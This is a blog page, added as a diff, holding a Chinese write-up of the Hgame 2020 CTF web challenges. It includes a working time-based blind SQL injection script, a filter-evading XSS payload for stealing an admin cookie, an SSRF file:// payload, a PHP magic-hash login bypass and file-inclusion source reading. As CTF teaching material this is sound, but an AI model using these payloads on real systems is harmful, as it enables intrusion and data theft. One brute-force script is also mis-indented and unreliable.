@@ -1,0 +1,643 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>不完整的Hgame2020-CTF的WP | AFKL&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="2020-杭电HgameWP2020年Hgame比赛WP由于我过于菜鸡，只能打到week2了...orz">
+<meta property="og:type" content="article">
+<meta property="og:title" content="不完整的Hgame2020-CTF的WP">
+<meta property="og:url" content="http://yoursite.com/2020/02/24/%E4%B8%8D%E5%AE%8C%E6%95%B4%E7%9A%84Hgame2020-CTF%E7%9A%84WP/index.html">
+<meta property="og:site_name" content="AFKL&#39;s Blog">
+<meta property="og:description" content="2020-杭电HgameWP2020年Hgame比赛WP由于我过于菜鸡，只能打到week2了...orz">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-02-24T12:08:00.000Z">
+<meta property="article:modified_time" content="2020-06-26T15:54:17.386Z">
+<meta property="article:author" content="AFKL">
+<meta property="article:tag" content="Blog">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="AFKL&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">AFKL&#39;s Blog</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-不完整的Hgame2020-CTF的WP" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/02/24/%E4%B8%8D%E5%AE%8C%E6%95%B4%E7%9A%84Hgame2020-CTF%E7%9A%84WP/" class="article-date">
+  <time datetime="2020-02-24T12:08:00.000Z" itemprop="datePublished">2020-02-24</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      不完整的Hgame2020-CTF的WP
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="2020-杭电HgameWP"><a href="#2020-杭电HgameWP" class="headerlink" title="2020-杭电HgameWP"></a>2020-杭电HgameWP</h1><p>2020年Hgame比赛WP<br>由于我过于菜鸡，只能打到week2了…orz</p>
+<p>[TOC]</p>
+<h1 id="week-1"><a href="#week-1" class="headerlink" title="week-1"></a>week-1</h1><h2 id="Cosmos-的博客"><a href="#Cosmos-的博客" class="headerlink" title="Cosmos 的博客"></a>Cosmos 的博客</h2><h3 id="考察点"><a href="#考察点" class="headerlink" title="考察点"></a>考察点</h3><p><code>/.git</code>信息泄露</p>
+<h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p>在首页中提示了出题人在github上保存了原代码。<br>尝试访问<code>http://cosmos.hgame.n3ko.co/.git/config</code>。得到项目保存的地址。<br>最后在<code>https://github.com/FeYcYodhrPDJSru/8LTUKCL83VLhXbc/commit/f79171d9c97a1ab3ea6c97b3eb4f0e1551549853</code>的历史记录中得到base64后的flag。</p>
+<pre><code>hgame{g1t_le@k_1s_danger0us_!!!!}</code></pre><h2 id="接-头-霸-王"><a href="#接-头-霸-王" class="headerlink" title="接 头 霸 王"></a>接 头 霸 王</h2><h3 id="考察点-1"><a href="#考察点-1" class="headerlink" title="考察点"></a>考察点</h3><p>请求头</p>
+<h3 id="过程-1"><a href="#过程-1" class="headerlink" title="过程"></a>过程</h3><p>类似于2019极客大挑战的 神秘的三叶草 一题。<br>但值得注意的是，这道题还考察了一个请求参数<code>If-Unmodified-Since:&lt;time&gt;</code><br>简单来说，这个参数的作用是进行一个判断：</p>
+<pre><code>如果 (在`&lt;time&gt;`时间点之后，文件没有被修改) 则
+    下载文件
+否则
+    返回412错误</code></pre><p>还有一个比较相似的参数<code>If-Modified-Since:&lt;time&gt;</code><br>和<code>If-Unmodified-Since:&lt;time&gt;</code>是反着来的：</p>
+<pre><code>如果 (在`&lt;time&gt;`时间点之后，文件修改过了) 则
+    下载文件
+否则
+    返回304错误</code></pre><p>在这道题只需将请求头修改即可：</p>
+<pre><code>POST http://kyaru.hgame.n3ko.co/ HTTP/1.1
+Host: kyaru.hgame.n3ko.co
+Referer: https://vidar.club
+X-Forwarded-For: 127.0.0.1
+User-Agent: Cosmos/114514
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+If-Unmodified-Since: Fri, 01 Jan 1077 00:00:00 GMT
+Content-Length: 0</code></pre><p>PS:这道题最开始使用GET请求即可，但后面不知道为什么又改成了POST</p>
+<pre><code>hgame{W0w!Your_heads_@re_s0_many!}</code></pre><p>PSS:<br>至于为什么一定是<code>If-Unmodified-Since</code>…<br>可能只是出题人单纯检测了一下请求？<br>亦或者是其它方式？好奇后端是怎么实现的…</p>
+<h2 id="Code-World"><a href="#Code-World" class="headerlink" title="Code World"></a>Code World</h2><h3 id="考察点-2"><a href="#考察点-2" class="headerlink" title="考察点"></a>考察点</h3><p>响应</p>
+<h3 id="过程-2"><a href="#过程-2" class="headerlink" title="过程"></a>过程</h3><p>初次打开返回了403，页面为new.php，且打开比较慢，便怀疑有页面重定向。<br>尝试抓包发现果然如此，并提示了405错误。说明请求方式有误，尝试POST请求。<br>请求后出现这样一段话(已格式化)：</p>
+<pre><code>&lt;center&gt;
+&lt;h1&gt;人鸡验证&lt;/h1&gt;
+&lt;br&gt;
+&lt;br&gt;
+目前它只支持通过url提交参数来计算两个数的相加，参数为a
+&lt;br&gt;
+&lt;br&gt;
+现在,需要让结果为10
+&lt;/center&gt;</code></pre><p>则提交：</p>
+<pre><code>POST http://codeworld.hgame.day-day.work/?a=5%2B5 HTTP/1.1
+Host: codeworld.hgame.day-day.work
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1</code></pre><p>即可获得flag<br>这里需要注意的是，一般浏览器里会把<code>+</code>认为是空格，这时候提交<code>%2B</code>即可。</p>
+<pre><code>hgame{C0d3_1s_s0_S@_sO_C0ol!}</code></pre><h2 id="🐔尼泰玫"><a href="#🐔尼泰玫" class="headerlink" title="🐔尼泰玫"></a>🐔尼泰玫</h2><h3 id="考察点-3"><a href="#考察点-3" class="headerlink" title="考察点"></a>考察点</h3><p>抓包改包<br>(js代码审计)</p>
+<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>在游戏过程中进行抓包，发现了一条奇怪的请求</p>
+<pre><code>POST http://cxk.hgame.wz22.cc/submit HTTP/1.1
+Host: cxk.hgame.wz22.cc
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
+Accept: */*
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 42
+
+score=400|68ae153a367158c60103d39d867c365a</code></pre><p>这里score=400便是我这次游戏的分数，后面的一串数据之后的代码审计解释。<br>我们进行改包，将400改为他所要求的30000便会得到<code>alert</code>的flag了。</p>
+<pre><code>hgame{j4vASc1pt_w1ll_tel1_y0u_someth1n9_u5efu1?!}</code></pre><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>这里我们对游戏的js代码进行审计<br>在<code>game.js</code>中发现这样一段（已格式化）</p>
+<pre><code>gameOver() 
+{
+    let po = &quot;ejIy&quot;;
+    let rt = po + &quot;LmNj&quot;;
+    let rou = &quot;L3N1Ym&quot;;
+    let sche = &quot;aHR0c&quot;;
+    let k = &quot;c2Nv&quot;;
+    let me = sche + &quot;DovL2N&quot;;
+    clearInterval(this.timer)
+    this.context.clearRect(0, 0, this.canvas.width, this.canvas.height)
+    let stamp = md5(Date.parse(new Date()) / 1000); 
+    this.globalScore = this.globalScore + this.storageScore; 
+    this.context.font = &apos;32px Microsoft YaHei&apos;
+    this.context.fillStyle = &apos;#000&apos;
+    this.context.fillText(&apos;CXK，你球掉了！得分：&apos; + this.globalScore, 404, 226)
+    $(&quot;#ballspeedset&quot;).removeAttr(&quot;disabled&quot;); let s = this.globalScore;
+    (
+        function () 
+        { 
+            let getU = me + &quot;4ay5oZ&quot;; 
+            let rl = getU + &quot;2FtZS53&quot;; 
+            let te = rou + &quot;1pdA&quot;; 
+            let ey = k + &quot;cmU=&quot;; 
+            $.post(atob(rl + rt + te), atob(ey) + &quot;=&quot; + s + &quot;|&quot; + stamp, function (data) { alert(data); }) 
+        }
+    )(); 
+    this.globalScore = 0;
+}</code></pre><p>其中</p>
+<pre><code>    let po = &quot;ejIy&quot;;
+    let rt = po + &quot;LmNj&quot;;
+    let rou = &quot;L3N1Ym&quot;;
+    let sche = &quot;aHR0c&quot;;
+    let k = &quot;c2Nv&quot;;
+    let me = sche + &quot;DovL2N&quot;;
+    let getU = me + &quot;4ay5oZ&quot;; 
+    let rl = getU + &quot;2FtZS53&quot;; 
+    let te = rou + &quot;1pdA&quot;; 
+    let ey = k + &quot;cmU=&quot;; 
+    $.post(atob(rl + rt + te), atob(ey) + &quot;=&quot; + s + &quot;|&quot; + stamp, function (data) { alert(data); }) 
+
+//其中(长见识了（（（)
+//rl=getUrl, rt=port, te=route, ey=key
+//base64解码后发现完整的post方法为
+$.post(&quot;http://cxk.hgame.wz22.cc/submit&quot;, &quot;score&quot; + &quot;=&quot; + s + &quot;|&quot; + stamp, function (data) { alert(data); }) 
+//即向 http://cxk.hgame.wz22.cc/submit 发送数据score=s|stamp，之后返回的数据会以alert的形式输出
+
+//其中s为我们的游戏分数
+//stamp为
+let stamp = md5(Date.parse(new Date()) / 1000); </code></pre><p>在分析完代码后，我们便可以修改js源码，伪造数据，获得flag</p>
+<pre><code>hgame{j4vASc1pt_w1ll_tel1_y0u_someth1n9_u5efu1?!}</code></pre><h1 id="week-2"><a href="#week-2" class="headerlink" title="week-2"></a>week-2</h1><h2 id="Cosmos的博客后台"><a href="#Cosmos的博客后台" class="headerlink" title="Cosmos的博客后台"></a>Cosmos的博客后台</h2><h3 id="考察点-4"><a href="#考察点-4" class="headerlink" title="考察点"></a>考察点</h3><p>逻辑漏洞<br>一些php的函数缺陷</p>
+<h3 id="过程-3"><a href="#过程-3" class="headerlink" title="过程"></a>过程</h3><p>在最开始可以得到一个登录页面。随即可以发现url疑似可以进行文件包含。<br><a href="http://cosmos-admin.hgame.day-day.work/index.php" target="_blank" rel="noopener">http://cosmos-admin.hgame.day-day.work/index.php</a><strong>?action=login.php</strong><br>将<code>login.php</code>替换为根目录下的<code>/flag</code>返回了<code>Hacker get out</code>应该是被过滤了。<br>尝试用php伪协议中的<code>php://filter/read</code>来进行php源码的读取。<br>得到<code>login.php</code>和<code>index.php</code>的源码。在<code>login.php</code>源码里顺藤摸瓜得到了<code>admin.php</code>文件源码。在其中还知道了一个<code>config.php</code>文件，但被过滤了，无法读取。<br>PS：方便起见这里只展示php源码。</p>
+<p><strong>login.php</strong></p>
+<pre><code>&lt;?php
+include &quot;config.php&quot;;
+session_start();
+
+//Only for debug
+if (DEBUG_MODE){
+    if(isset($_GET[&apos;debug&apos;])) {
+        $debug = $_GET[&apos;debug&apos;];
+        if (!preg_match(&quot;/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/&quot;, $debug)) {
+            die(&quot;args error!&quot;);
+        }
+        eval(&quot;var_dump($$debug);&quot;);
+    }
+}
+
+if(isset($_SESSION[&apos;username&apos;])) {
+    header(&quot;Location: admin.php&quot;);
+    exit();
+}
+else {
+    if (isset($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;])) {
+        if ($admin_password == md5($_POST[&apos;password&apos;]) &amp;&amp; $_POST[&apos;username&apos;] === $admin_username){
+            $_SESSION[&apos;username&apos;] = $_POST[&apos;username&apos;];
+            header(&quot;Location: admin.php&quot;);
+            exit();
+        }
+        else {
+            echo &quot;??¨??·???????ˉ?? ?é??èˉˉ&quot;;
+        }
+    }
+}
+?&gt;</code></pre><p><strong>index.php</strong></p>
+<pre><code>&lt;?php
+error_reporting(0);
+session_start();
+
+if(isset($_SESSION[&apos;username&apos;])) {
+    header(&quot;Location: admin.php&quot;);
+    exit();
+}
+
+$action = @$_GET[&apos;action&apos;];
+$filter = &quot;/config|etc|flag/i&quot;;
+
+if (isset($_GET[&apos;action&apos;]) &amp;&amp; !empty($_GET[&apos;action&apos;])) {
+    if(preg_match($filter, $_GET[&apos;action&apos;])) {
+        echo &quot;Hacker get out!&quot;;
+        exit();
+    }
+        include $action;
+}
+elseif(!isset($_GET[&apos;action&apos;]) || empty($_GET[&apos;action&apos;])) {
+    header(&quot;Location: ?action=login.php&quot;);
+    exit();
+}</code></pre><p><strong>admin.php</strong></p>
+<pre><code>&lt;?php
+include &quot;config.php&quot;;
+session_start();
+if(!isset($_SESSION[&apos;username&apos;])) {
+    header(&apos;Location: index.php&apos;);
+    exit();
+}
+
+function insert_img() {
+    if (isset($_POST[&apos;img_url&apos;])) {
+        $img_url = @$_POST[&apos;img_url&apos;];
+        $url_array = parse_url($img_url);
+        if (@$url_array[&apos;host&apos;] !== &quot;localhost&quot; &amp;&amp; $url_array[&apos;host&apos;] !== &quot;timgsa.baidu.com&quot;) {
+            return false;
+        }   
+        $c = curl_init();
+        curl_setopt($c, CURLOPT_URL, $img_url);
+        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
+        $res = curl_exec($c);
+        curl_close($c);
+        $avatar = base64_encode($res);
+
+        if(filter_var($img_url, FILTER_VALIDATE_URL)) {
+            return $avatar;
+        }
+    }
+    else {
+        return base64_encode(file_get_contents(&quot;static/logo.png&quot;));
+    }
+}
+?&gt;
+
+&lt;?php echo insert_img() ? insert_img() : base64_encode(file_get_contents(&quot;static/error.jpg&quot;)); ?&gt;</code></pre><p>可以看到，从<code>index.php</code>的文件包含来获取flag是不太可能了，只能找其它方法。<br>在<code>admin.php</code>中我们可以看到有一个利用base64来读取远程和本地图片的脚本。或许我们可以对其进行利用。但首先我们需要用管理员账号登录上去。<br>随后便可以找到登录验证的代码：</p>
+<pre><code>if ($admin_password == md5($_POST[&apos;password&apos;]) &amp;&amp; $_POST[&apos;username&apos;] === $admin_username)
+{
+    $_SESSION[&apos;username&apos;] = $_POST[&apos;username&apos;];
+    header(&quot;Location: admin.php&quot;);
+    exit();
+}
+else 
+{
+    echo &quot;??¨??·???????ˉ?? ?é??èˉˉ&quot;;
+}</code></pre><p>这样，我们就要想办法得到两个变量的值<code>$admin_password</code>，<code>admin_username</code>。<br>还不难注意到在<code>login.php</code>中有一个debug-mode，只要输入变量，他就会执行eval(“var_dump($$debug);”);来显示变量。这正是我们需要的。<br>得到了账号和md5后的密码：</p>
+<pre><code>username:Cosmos!
+MD5(password):0e114902927253523756713132279690</code></pre><p>可以看到MD5后的密码是<code>0e+数字</code>，且比较时也不是严格比较，所以可以绕过。<br>登录后来到<code>admin.php</code>页面，分析php源码，得到几个重要函数：</p>
+<pre><code>filter_var($img_url, FILTER_VALIDATE_URL);
+//这是一个过滤器函数，通过过滤器来返回过滤的部分。
+parse_url($img_url);
+/*
+这个函数是将一个url拆解为几个部分，如下的url会被拆解为几个部分：
+http://username:password@hostname/path?arg=value#anchor
+Array
+(
+    [scheme] =&gt; http
+    [host] =&gt; hostname
+    [user] =&gt; username
+    [pass] =&gt; password
+    [path] =&gt; /path
+    [query] =&gt; arg=value
+    [fragment] =&gt; anchor
+)
+*/</code></pre><p>在<code>admin.php</code>，中有这么一段代码</p>
+<pre><code>$img_url = @$_POST[&apos;img_url&apos;];
+$url_array = parse_url($img_url);
+...
+if (@$url_array[&apos;host&apos;] !== &quot;localhost&quot; &amp;&amp; $url_array[&apos;host&apos;] !== &quot;timgsa.baidu.com&quot;) 
+{
+    return false;
+} </code></pre><p>它明确要求了文件的host来自<code>localhost</code>或<code>timgsa.baidu.com</code>，否则会导致函数返回<code>false</code>。我们可以使用file协议使条件符合：<br><code>file://localhost/flag</code><br>PS：理论上，file协议也是有host部分的，但这个协议本身就是解析本地文件的，所以被省略了。但还是需要注意host部分必须是localhost，否则会出错。<br>PSS：在我windows本地环境中使用以下php脚本：</p>
+<pre><code>&lt;?php
+$url = &apos;file://localhost/D:/114514.txt&apos;;
+print_r(parse_url($url));
+$c = curl_init();
+curl_setopt($c, CURLOPT_URL, $url);
+curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
+$res = curl_exec($c);
+curl_close($c);
+if(filter_var($url, FILTER_VALIDATE_URL))
+{
+    print(&apos;working&apos;);
+    echo $res;
+}
+?&gt;
+
+/*
+Output:
+Array
+(
+    [scheme] =&gt; file
+    [host] =&gt; localhost
+    [path] =&gt; /D:/114514.txt
+)
+working
+
+当$url=&apos;file:///D:/114514.txt&apos;;时
+Array
+(
+    [scheme] =&gt; file
+    [path] =&gt; /D:/114514.txt
+)
+workingいいよ！こいよ！
+*/</code></pre><p>不知道为什么链接解析成功了，但没有<code>114514.txt</code>的文件内容。在5.2.17和7.3.4的环境都试过了，都不行…但在题目中使用<code>file://localhost/flag</code>是可以得到文件内容的…<br>总之得到了flag：</p>
+<pre><code>hgame{pHp_1s_Th3_B3sT_L4nGu4gE!@!}</code></pre><h2 id="Cosmos的留言板-1"><a href="#Cosmos的留言板-1" class="headerlink" title="Cosmos的留言板-1"></a>Cosmos的留言板-1</h2><h3 id="考察点-5"><a href="#考察点-5" class="headerlink" title="考察点"></a>考察点</h3><p>sql时间盲注（或许？</p>
+<h3 id="过程-4"><a href="#过程-4" class="headerlink" title="过程"></a>过程</h3><p>说来丢人，这道题最开始手注了很长时间，一直都没有成功。无奈之下使用了sqlmap，发现可以使用时间盲注。<br>这道题过滤了<code>select</code>和空格，不过不是大问题，<code>select</code>大写或双写绕过、空格用<code>/**/</code>绕过。但让我费解的是<code>#</code>和<code>--+</code>虽然没有被过滤，但似乎并没有被sql解析…不知道为什么。不过还是有办法的，用<code>AND/**/&#39;1</code>即可。<br>那不多说了，直接上脚本：</p>
+<pre><code>import requests
+
+mode = input(&quot;plz input use mode:&quot;)
+
+while(True):
+    if(mode == &apos;T&apos;):
+        payload = &apos;1\&apos;UNION/**/SELECT(if((ascii(substr((SELECT/**/group_concat(TABLE_NAME)/**/FROM/**/information_schema.TABLES/**/WHERE/**/TABLE_SCHEMA=database()),%s,1))=%s),sleep(10),1))/**/AND/**/\&apos;1&apos;
+        break
+
+    elif(mode == &apos;C&apos;):
+        tab = input(&apos;plz input tables_name:&apos;)
+        payload = &apos;1\&apos;UNION/**/SELECT(if((ascii(substr((SELECT/**/group_concat(COLUMN_NAME)/**/from/**/information_schema.COLUMNS/**/where/**/TABLE_NAME=0x&apos;+tab.encode(&apos;UTF-8&apos;).hex()+&apos;),%s,1))=%s),sleep(10),1))/**/AND/**/\&apos;1&apos;
+        break
+
+    elif(mode == &apos;F&apos;):
+        tab = input(&apos;plz input tables_name:&apos;)
+        col = input(&apos;plz input col_name:&apos;)
+        payload = &apos;1\&apos;UNION/**/SELECT(if((ascii(substr((SELECT/**/&apos;+ col +&apos;/**/FROM/**/&apos;+ tab +&apos;),%s,1))=%s),sleep(10),1))/**/AND/**/\&apos;1&apos;
+        break
+
+    elif(mode != &apos;F&apos;|&apos;C&apos;|&apos;T&apos;):
+        print(&apos;Error&apos;)
+
+url = &apos;http://139.199.182.61/index.php?id=&apos;
+res = &apos;&apos;
+sel_num = input(&quot;plz input sel_num:&quot;)
+
+for i in range(1,int(sel_num)):
+    print(i)
+    for j in range(32,127):
+        now_payload = payload % (i,j)
+        now_url = url + now_payload
+        try:
+            r = requests.get(url=now_url,timeout=4.5)
+        except:
+            res += chr(j)
+            print(res)
+            break
+print(res)
+
+a = input(&quot;按任意键退出&quot;)
+exit()
+
+# 查到两个表：f1aggggggggggggg,messages
+# flag表中只有一列：fl4444444g
+# 得到flag：hgame{w0w_sql_InjeCti0n_Is_S0_IntereSting!!}</code></pre><p>PS：这个脚本是我根据swpuctf的脚本改编的，修正了上一个脚本的小错误（顺便小小优化了一下代码，避免没必要的操作。</p>
+<pre><code>hgame{w0w_sql_InjeCti0n_Is_S0_IntereSting!!}</code></pre><h2 id="Cosmos的新语言"><a href="#Cosmos的新语言" class="headerlink" title="Cosmos的新语言"></a>Cosmos的新语言</h2><h3 id="考察点-6"><a href="#考察点-6" class="headerlink" title="考察点"></a>考察点</h3><p>脚本编写</p>
+<h3 id="过程-5"><a href="#过程-5" class="headerlink" title="过程"></a>过程</h3><p>这道题就是写脚本，首先在主页中可以看到一串变换的字符串，在<code>./mycode</code>中就知道这是token加密后的密文。只有当post的token和服务器的token对应即可获得flag。比较坑的一点是，只有深入尝试后才能知道这道题变化的不只有token，还有加密方式。<br>8说了，上我辣鸡的python脚本：</p>
+<pre><code>import base64
+import requests
+import re
+import codecs
+
+catchPasswd = str(requests.get(&quot;http://7bf62224db.php.hgame.n3ko.co/&quot;).text)
+# 得密文
+catchCrypt = str(requests.get(&quot;http://7bf62224db.php.hgame.n3ko.co/mycode&quot;).text)
+# 得加密方法
+
+catchPasswd = re.sub(r&apos;(^.*\s)(.*\s)&lt;/span&gt;(.*\s)&lt;/code&gt;&lt;br&gt;.*\s&apos;, &quot;&quot;, catchPasswd)
+catchPasswd = re.sub(r&apos;&lt;br&gt;(.*\s)(.*\s)(.*\s)&lt;/html&gt;&apos;, &quot;&quot;, catchPasswd)
+# 正则消去无用部分
+
+catchCrypt = re.sub(r&apos;(.*\s)(.*\s)(.*\s)echo\(&apos;, &quot;&quot;, catchCrypt)
+catchCrypt = re.sub(r&apos;function(.*\s)(.*\s)(.*\s)(.*\s)(.*\s)&apos;, &quot;&quot;, catchCrypt)
+catchCrypt = re.sub(r&apos;\)\)\)\)\)\)\)\)\)\)\);(.*\s).*\s}&apos;, &quot;&quot;, catchCrypt)
+# 令人智熄的正则（（（
+
+crypt = catchCrypt.split(&quot;(&quot;, 10)
+# 以‘(’为界限，把字符串分割
+
+passwd = catchPasswd
+
+def strrev(string):
+    result = &apos;&apos;.join(reversed(string))
+    return str(result)
+
+def decrypt(string):
+    result = &apos;&apos;
+    for i in range(0,len(string)):
+        result += chr(ord(string[i]) - 1)
+    return str(result)
+
+def base64_decode(string):
+    result = base64.b64decode(string).decode(&apos;utf-8&apos;)
+    return str(result)
+
+def str_rot13(string):
+    result = codecs.getencoder(&quot;rot-13&quot;)(string)
+    return result[0]
+# 各个加密的函数
+
+for i in range(0, 10):
+    if(crypt[i] == &apos;strrev&apos;):
+        passwd = strrev(passwd)
+    elif(crypt[i] == &apos;str_rot13&apos;):
+        passwd = str_rot13(passwd)
+    elif(crypt[i] == &apos;base64_encode&apos;):
+        passwd = base64_decode(passwd)
+    elif(crypt[i] == &apos;encrypt&apos;):
+        passwd = decrypt(passwd)
+# 解密部分，因为固定加密10次，所以循环判断10次即可
+
+send = requests.post(&quot;http://7bf62224db.php.hgame.n3ko.co/&quot;, data={&apos;token&apos; : passwd })
+print(send.text)
+# 打印输送token后得到的网页</code></pre><p>得到flag：</p>
+<pre><code>hgame{5!MPLe-$criPT~WITh_pyThon~OR~PHp}</code></pre><h2 id="Cosmos的聊天室"><a href="#Cosmos的聊天室" class="headerlink" title="Cosmos的聊天室"></a>Cosmos的聊天室</h2><h3 id="考察点-7"><a href="#考察点-7" class="headerlink" title="考察点"></a>考察点</h3><p>XSS<br>md5截断验证</p>
+<h3 id="过程-6"><a href="#过程-6" class="headerlink" title="过程"></a>过程</h3><p>这道题的过滤方式很有趣：<br>1.循环过滤<code>&lt;&gt;</code>以及其之间的所有字符<br>2.<code>script</code>会变为<code>HI THERE!</code><br>3.所有的字符大写<br>不过即使如此也可以进行XSS</p>
+<pre><code>&lt;img src=1 onerror=&apos;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&apos;&lt;
+&lt;!- 即：&lt;img src=1 onerror=&apos;alert(1)&apos;&gt; -&gt;</code></pre><p>1.根据html不严谨的语法规则，即使没有<code>&gt;</code>封闭语句也可以正常显示<br>PS：后端的python代码好像还帮忙补全了后面的<code>&lt;</code>（（（<br>2.使用<code>img</code>标签和<code>onerror</code>事件来避免使用<code>script</code>字符串<br>3.使用实体编码<code>&amp;#(ascii十进制);</code>来规避字符的大写<br>这样就可以盗取管理员的cookie来查看flag了<br>还有，关于实体编码网上还没有可以直接白嫖的，自己拿C瞎打了一个<br>（感觉用C更简单（bin选手憋喷我（</p>
+<pre><code>#include &lt;stdio.h&gt;
+
+int main()
+{
+    char a=0;
+    while(1)
+    {
+        scanf(&quot;%c&quot;, &amp;a);
+        if(a != 0x0A)
+            printf(&quot;&amp;#%d;&quot;, a);
+    }
+    return 0;
+}</code></pre><p>另外，想让管理bot点击页面，还需要发送一段md5截断验证<br>这里直接给白嫖的python脚本（还是多线程的：</p>
+<pre><code>import hashlib
+from multiprocessing.dummy import Pool as ThreadPool
+
+def md5(s): # 计算MD5字符串
+    return hashlib.md5(str(s).encode(&apos;utf-8&apos;)).hexdigest()
+
+keymd5 = input(&quot;set:&quot;)
+md5start = 0
+md5length = 6
+
+def findmd5(sss):
+#已知的md5截断值 # 设置题目已知的截断位置 # 输入范围 里面会进行md5测试
+    key = sss.split(&apos;:&apos;)
+    start = int(key[0])
+    end = int(key[1])
+# 开始位置 # 结束位置
+    result = 0
+    for i in range(start, end): 
+        if md5(i)[0:6] == keymd5:
+            result = i
+            print(result)
+            break
+
+
+list=[] # 参数列表
+for i in range(10):
+    pool = ThreadPool() # 打印 # 拿到加密字符串 # 多线程的数字列表 开始与结尾
+list.append(str(100000000*i) + &apos;:&apos; + str(100000000*(i+1))) # 多线程任务
+pool.map(findmd5, list) # 函数 与参数列表
+pool.close()
+pool.join()</code></pre><p>得到token：<code>f802788a02a51f9c624bb5d91815b</code><br>得到flag：</p>
+<pre><code>hgame{xsS_1s_r3a11y_inTeresT1ng!!}</code></pre>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/02/24/%E4%B8%8D%E5%AE%8C%E6%95%B4%E7%9A%84Hgame2020-CTF%E7%9A%84WP/" data-id="ckbweck8s00078892432vg3uk" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/02/24/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          SQL注入笔记
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/02/24/Hello-World-0/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Hello World!!!</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/06/17/dozerCTF-Fake-phpminiadmin/">dozerCTF - Fake phpminiadmin</a>
+          </li>
+        
+          <li>
+            <a href="/2020/05/24/BJDCTF-3rd-%E5%B0%8F%E7%9F%A5%E8%AF%86%E7%82%B9/">BJDCTF 3rd-小知识点</a>
+          </li>
+        
+          <li>
